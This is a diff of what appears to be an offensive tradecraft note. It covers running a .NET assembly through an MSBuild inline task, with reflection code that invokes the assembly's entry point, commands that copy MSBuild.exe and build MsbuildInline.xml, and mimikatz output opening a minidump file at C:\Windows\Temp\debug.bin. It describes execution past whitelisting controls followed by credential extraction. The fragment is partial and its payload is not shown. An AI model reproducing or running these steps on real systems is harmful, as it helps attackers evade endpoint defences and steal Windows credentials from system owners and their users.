@@ -25,6 +25,13 @@ Change Execution to:
 			 
 			 //Below Two lines get commented if args needed
 			 //object o = a.CreateInstance(method.Name);
+                         //method.Invoke(o, null);
+			 
+			 //If Args are required uncomment below two lines and comment the two above lines
+			 //string[] args1 = new string[] { "BasicOSInfo" };
+                         //a.EntryPoint.Invoke(null, new object[] { args1 });			 
+			 //Below Two lines get commented if args needed
+			 //object o = a.CreateInstance(method.Name);
             		 //method.Invoke(o, null);
 			 
 			 //If Args are required uncomment below two lines and comment above line
@@ -33,6 +40,7 @@ Change Execution to:
 			 string args3 = "\"test\"";
 			 a.EntryPoint.Invoke(null, new object[] { new string[] { args1, args2, args3 } });
 
+Then run:
 copy C:\Windows\Microsoft.NET\v4.0.30319\MSBuild.exe .
 MsBuild.exe MsbuildInline.xml
 Microsoft (R) Build Engine version 4.7.2053.0
@@ -60,7 +68,7 @@ Void Main(System.String[])
   '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
 
 mimikatz # Opening : 'C:\Windows\Temp\debug.bin' file for minidump...
-
+<SNIPPED>
 
 
 
